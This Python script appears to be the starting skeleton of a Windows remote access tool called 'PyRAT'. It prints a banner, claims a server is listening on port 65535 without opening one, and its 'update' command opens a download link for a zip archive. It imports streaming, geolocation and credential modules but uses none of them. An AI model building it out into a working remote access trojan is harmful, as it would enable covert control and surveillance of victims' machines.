import webbrowser

import pyfiglet
import colorama
from colorama import Fore
import socket
import os
import platform
import getpass
import geocoder
from vidstream import StreamingServer
import time
from datetime import datetime
import requests


red = Fore.LIGHTRED_EX
green = Fore.LIGHTGREEN_EX
blue = Fore.LIGHTBLUE_EX
white = Fore.WHITE
cyan = Fore.LIGHTCYAN_EX
yellow = Fore.YELLOW

info = white + "[" + green + "info" + white + "]"
error = white + "[" + red + "Error" + white + "]"
suggestion = white + "[" + blue + "*" + white + "]"
avviso = white + "[" + white + "⚠️" + white + "]"

tot_modules = requests.get("https://beatino029.github.io/Beato029/modules.json")
tot_modules = tot_modules.json()["modules"]

version_check = requests.get("https://beatino029.github.io/Beato029/version.json")
version_check = version_check.json()["version"]

VERSION = "1.0.0"

installed_modules = "100"


def LOGO():
    print("=" * 85)
    print(white + " [" + cyan + "verison" + white + "]", version_check, f"| [web] https://beatino029.github.io/Beato029/version.json")
    print("=" * 85)
    print(white + " [" + cyan + "documentation" + white + "]", "| [web] https://github.com/Beatino029/Beato029/blob/main/README.md")
    print("=" * 85)

    logo = pyfiglet.figlet_format("PyRAT")
    print(green + logo)
    print("     ", cyan + tot_modules, white + "existing modules")
    print("")
    print("     ", cyan + installed_modules, white + "installed modules")
    print(red + "-" * 50)

    if version_check > VERSION:
        print(avviso, yellow + f"NEW UPDATE {version_check} IS AVAIABLE!!!!")

    ip_0000 = (yellow + "0") + "." + (yellow + "0") + "." + (yellow + "0") + "." + (yellow + "0")
    print(info + " Server listening on", ip_0000 + white + ":" + yellow + "65535")
    print(suggestion, "Print 'help' to view command")
    print(suggestion, "Print 'update' to check update")
    print(suggestion, "Print 'doc' to view documentation")
    print("")
    Start()




def Start():
    host = socket.gethostname()
    while True:
        print("")
        root = input("\033[4m" + host + "\033[0m" + " >> ")


        if root == "help":
            print("""
Command:        Type:                Description:
------------    _____________        -----------------------
help            <COMMAND>            Print this message
update          <COMMAND>            Check update 
doc             <LINK>               View documentation
cls             <COMMAND>            Clear screen
exit            <COMMAND>            Close program """)


        elif root == "update":
            if version_check > VERSION: #>
                print(info, f"New update is avaiable {version_check}")
                print("You will be directed to the download...")
                webbrowser.open("https://github.com/Beatino029/Beato029/files/10385764/Nuovo.Archivio.WinRAR.ZIP.zip")
            else:
                print(error, "Not update is avaiable")

        elif root == "exit":
            quit()

        else:
            print(error, f" - '{root}' command not found")



if __name__ == "__main__":
    os.system("cls")
    print(info, "Check device compatibility...")
    get_sysname = platform.system()
    print(info, f"Device found: {get_sysname}")
    if get_sysname == "Windows":
        print(info, "Device compatibles...")
        time.sleep(0.5)
        LOGO()
    else:
        print(error, "Your device is not compatible, sorry :(")
